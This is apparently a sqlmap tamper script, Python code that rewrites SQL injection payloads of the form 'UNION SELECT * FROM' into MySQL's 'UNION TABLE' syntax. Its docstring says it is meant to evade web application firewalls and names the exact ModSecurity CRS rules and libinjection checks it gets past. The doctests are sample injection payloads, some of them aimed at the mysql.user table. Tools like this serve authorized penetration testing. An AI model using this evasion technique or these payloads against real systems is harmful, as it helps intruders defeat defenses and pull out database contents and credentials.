#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    Replaces UNION SELECT * FROM <table> with the (MySQL) explicit table statement UNION TABLE <table>

    Requirement:
        * MySQL >= 8.0.19

    Tested against:
        * MySQL 8.0.36, 8.0.46, 8.4.9, 9.4.0
        * Percona 8.0.46

    Notes:
        * Useful to bypass web application firewalls, as the resulting payload contains neither
          the SELECT nor the FROM keyword. Verified against ModSecurity v3 with the OWASP CRS
          (paranoia level 1, blocking mode), where the plain counterpart scores 20 anomaly
          points and is blocked, while the rewritten payload drops to 5 (rule 942360 alone,
          see below) or to 0 when chained with tamper script 'odbcbrace'
        * The rule doing most of the work there is 942270 '(?i)union.*?select.*?from', which
          needs all three keywords in that order. TABLE <table> is a complete query block on
          its own (sql_yacc.yy query_primary has exactly three alternatives: SELECT, VALUES and
          TABLE), so the branch carries none of them
        * Also rated benign by libinjection 4.0.0, which is CRS rule 942100
        * TABLE <table> is strictly defined as SELECT * FROM <table>, hence only a bare '*'
          column list is rewritten. Payloads carrying an explicit column list are deliberately
          left untouched, as TABLE can neither project columns nor carry the concatenated
          delimiters used for retrieving the query output
        * Trailing ORDER BY and LIMIT clauses are supported by TABLE and are kept as they are,
          while a WHERE clause is not, hence such payloads are deliberately left untouched
        * Both the UNION branch form and the parenthesized subquery form are rewritten
        * On its own the rewritten payload still trips CRS rule 942360
          '^[\\W\\d]+\\s*?<keyword>' when it starts with a bare number. Chaining it with
          tamper script 'odbcbrace' clears that too: --tamper=uniontable,odbcbrace
        * MariaDB does not implement the TABLE statement at all

    >>> tamper('-1 UNION ALL SELECT * FROM users-- -')
    '-1 UNION ALL TABLE users-- -'
    >>> tamper('-1 UNION SELECT * FROM `mysql`.`user`#')
    '-1 UNION TABLE `mysql`.`user`#'
    >>> tamper('-1 UNION ALL SELECT * FROM users ORDER BY 1 LIMIT 1-- -')
    '-1 UNION ALL TABLE users ORDER BY 1 LIMIT 1-- -'
    >>> tamper('-1 AND (SELECT * FROM one)=0x41-- -')
    '-1 AND (TABLE one)=0x41-- -'
    >>> tamper('-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL FROM users-- -')
    '-1 UNION ALL SELECT NULL,CONCAT(0x716b6a7671,0x41,0x7170707671),NULL FROM users-- -'
    >>> tamper('-1 UNION SELECT * FROM users WHERE id=1-- -')
    '-1 UNION SELECT * FROM users WHERE id=1-- -'
    """

    def _union(match):
        tail = (match.group("tail") or "").strip()

        if tail and not re.match(r"(?i)\A(?:ORDER\s+BY|LIMIT)\b", tail):
            return match.group(0)

        return "%s%s TABLE %s%s" % (match.group("union"), match.group("all") or "", match.group("table"), (" %s" % tail) if tail else "")

    def _subquery(match):
        tail = (match.group("tail") or "").strip()

        if tail and not re.match(r"(?i)\A(?:ORDER\s+BY|LIMIT)\b", tail):
            return match.group(0)

        return "(TABLE %s%s)" % (match.group("table"), (" %s" % tail) if tail else "")

    retVal = payload

    if retVal:
        retVal = re.sub(r"(?i)(?P<union>UNION)(?P<all>\s+ALL)?\s+SELECT\s+\*\s+FROM\s+(?P<table>`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)(?P<tail>[\s\S]*?)(?=(?:--|#|/\*)|\Z)", _union, retVal)
        retVal = re.sub(r"(?i)\(\s*SELECT\s+\*\s+FROM\s+(?P<table>`[^`]+`(?:\.`[^`]+`)?|\w+(?:\.\w+)?)(?P<tail>[^()]*?)\s*\)", _subquery, retVal)

    return retVal
